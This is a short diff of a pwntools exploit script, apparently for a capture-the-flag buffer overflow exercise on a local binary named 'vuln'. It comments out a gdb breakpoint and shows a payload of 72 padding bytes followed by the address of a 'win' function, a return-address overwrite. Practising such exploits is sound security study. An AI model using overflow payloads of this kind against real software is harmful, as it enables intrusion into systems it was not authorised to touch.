@@ -23,9 +23,9 @@ from pwn import *
 
 e = ELF('./vuln')
 p=process(e.path)
-gdb.attach(p, '''
-b* win + 30
-''')
+#gdb.attach(p, '''
+#b* win + 30
+#''')
 winAddr = p64(e.sym['win']+8)
 ofset = 72
 payload = b'A'*ofset+winAddr
